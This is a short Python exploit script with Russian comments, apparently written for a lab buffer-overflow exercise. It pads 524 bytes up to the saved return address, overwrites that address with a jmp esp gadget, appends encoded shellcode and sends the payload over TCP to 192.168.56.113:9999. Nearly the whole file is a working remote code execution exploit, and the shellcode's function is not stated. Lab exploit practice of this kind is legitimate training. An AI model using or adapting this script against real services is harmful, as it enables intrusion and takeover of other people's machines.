import socket

# Смещение до saved EIP:
OFFSET_RET = 524

# Адрес gadget jmp esp (пример):
gadget_addr = 0x311712F3

# 1) «Заполнитель» до ret:
junk = b"A" * OFFSET_RET

# 2) Перезапись return-address:
ret = b"\xf3\x12\x17\x31" 

# 3) NOP-sled:
nop_sled = b"\x90" * 1

# 4) Ваш shellcode:
#buf =  b"C" * 300
buf =  b""
buf += b"\xbf\x79\x75\x8c\x13\xdb\xdf\xd9\x74\x24\xf4\x58"
buf += b"\x29\xc9\xb1\x31\x31\x78\x13\x83\xe8\xfc\x03\x78"
buf += b"\x76\x97\x79\xef\x60\xd5\x82\x10\x70\xba\x0b\xf5"
buf += b"\x41\xfa\x68\x7d\xf1\xca\xfb\xd3\xfd\xa1\xae\xc7"
buf += b"\x76\xc7\x66\xe7\x3f\x62\x51\xc6\xc0\xdf\xa1\x49"
buf += b"\x42\x22\xf6\xa9\x7b\xed\x0b\xab\xbc\x10\xe1\xf9"
buf += b"\x15\x5e\x54\xee\x12\x2a\x65\x85\x68\xba\xed\x7a"
buf += b"\x38\xbd\xdc\x2c\x33\xe4\xfe\xcf\x90\x9c\xb6\xd7"
buf += b"\xf5\x99\x01\x63\xcd\x56\x90\xa5\x1c\x96\x3f\x88"
buf += b"\x91\x65\x41\xcc\x15\x96\x34\x24\x66\x2b\x4f\xf3"
buf += b"\x15\xf7\xda\xe0\xbd\x7c\x7c\xcd\x3c\x50\x1b\x86"
buf += b"\x32\x1d\x6f\xc0\x56\xa0\xbc\x7a\x62\x29\x43\xad"
buf += b"\xe3\x69\x60\x69\xa8\x2a\x09\x28\x14\x9c\x36\x2a"
buf += b"\xf7\x41\x93\x20\x15\x95\xae\x6a\x73\x68\x3c\x11"
buf += b"\x31\x6a\x3e\x1a\x65\x03\x0f\x91\xea\x54\x90\x70"
buf += b"\x4f\xaa\xda\xd9\xf9\x23\x83\x8b\xb8\x29\x34\x66"
buf += b"\xfe\x57\xb7\x83\x7e\xac\xa7\xe1\x7b\xe8\x6f\x19"
buf += b"\xf1\x61\x1a\x1d\xa6\x82\x0f\x7e\x29\x11\xd3\xaf"
buf += b"\xcc\x91\x76\xb0"


# 5) Собираем финальный payload:
payload = junk + ret + nop_sled + buf

# Проверки:
badchars = [b"\x00", b"\x0a", b"\x0d"]
assert len(payload) <= 1000
assert not any(bad in payload for bad in badchars), \
       f"Payload contains one of badchars: {badchars!r}"

# 6) Подключение и отправка:
target_ip = "192.168.56.113"
target_port = 9999

try:
    print(f"[+] Connecting to {target_ip}:{target_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        banner = s.recv(1024)  # Получаем баннер или приглашение
        print(banner.decode(errors="ignore"))
        s.sendall(payload)
        print("[+] Payload sent successfully.")
except Exception as e:
    print(f"[!] Connection failed: {e}")
